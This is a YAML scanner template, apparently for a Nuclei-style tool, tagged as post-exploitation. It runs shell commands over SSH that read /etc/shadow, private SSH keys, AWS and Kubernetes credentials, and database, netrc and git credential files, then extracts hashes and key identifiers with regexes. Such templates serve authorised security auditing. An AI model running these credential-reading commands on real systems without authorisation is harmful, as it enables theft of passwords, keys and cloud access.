id: ssh-credential-files-linux
service: [ssh]
info:
  name: SSH Linux Credential File Discovery
  severity: high
  tags: ssh,post-exploit,credential,linux

services:
  - ops:
      - shell: "uname -s 2>/dev/null"
        name: os_check
    matchers:
      - type: word
        part: os_check
        words: ["Linux", "Darwin", "FreeBSD"]
        condition: or

  - ops:
      - shell: "cat /etc/shadow 2>/dev/null"
        name: shadow
    matchers:
      - type: regex
        part: shadow
        regex: ['^\w+:\$']
    extractors:
      - type: regex
        name: shadow_hashes
        part: shadow
        regex: ['^(\w+:\$[^:]+)']

  - ops:
      - shell: "cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ecdsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null"
        name: ssh_key
    matchers:
      - type: word
        part: ssh_key
        words: ["PRIVATE KEY"]
    extractors:
      - type: regex
        name: key_type
        part: ssh_key
        regex: ['-----BEGIN (\S+ PRIVATE KEY)-----']
        group: 1

  - ops:
      - shell: "cat ~/.aws/credentials 2>/dev/null"
        name: aws_creds
    matchers:
      - type: word
        part: aws_creds
        words: ["aws_access_key_id"]
    extractors:
      - type: regex
        name: aws_key
        part: aws_creds
        regex: ['aws_access_key_id\s*=\s*(\S+)']
        group: 1

  - ops:
      - shell: "cat ~/.kube/config 2>/dev/null | head -20"
        name: kube_config
    matchers:
      - type: word
        part: kube_config
        words: ["apiVersion"]
    extractors:
      - type: regex
        name: kube_server
        part: kube_config
        regex: ['server:\s*(\S+)']
        group: 1

  - ops:
      - shell: "cat ~/.my.cnf 2>/dev/null; cat ~/.pgpass 2>/dev/null; cat ~/.netrc 2>/dev/null; cat ~/.git-credentials 2>/dev/null"
        name: misc_creds
    matchers:
      - type: word
        part: misc_creds
        words: ["password", "Password"]
        condition: or
